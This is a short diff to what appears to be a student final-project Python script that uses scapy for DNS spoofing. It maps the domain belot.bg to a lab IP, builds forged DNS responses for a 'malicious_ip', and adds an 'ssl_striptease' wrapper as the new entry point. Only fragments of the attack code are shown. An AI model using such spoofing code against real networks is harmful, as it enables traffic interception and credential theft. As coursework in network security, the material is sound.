@@ -6,7 +6,6 @@ import final_project_code as fpc
 import time
 
 REPOISON_TIME = int(10)
-
 dns_hosts = {
     b"belot.bg.": "10.0.2.6",
 }
@@ -14,8 +13,17 @@ dns_hosts = {
 # target_ip = "10.0.2.4"
 # ip_to_spoof = "10.0.2.6"
 
+
+
+
+def ssl_striptease():
+    print("\nStarting DNS spoofing...")
+    ssl_dns_spoofing()
+    print("\nDNS Spoofing Complete!")
+
+
 def ssl_dns_spoofing():
-    #conf.verb = 0 # make scapy verbose (no output)
+    conf.verb = 0 # make scapy verbose (no output)
 
     iface = fpc.get_interface()
 
@@ -109,8 +117,6 @@ def build_dns_response_packet(pkt, malicious_ip):
         new_pkt = eth / ip / udp / dns
         return new_pkt
 
-
-
 # call main
 if __name__=="__main__":
-    dns_spoofing()
+    ssl_striptease()
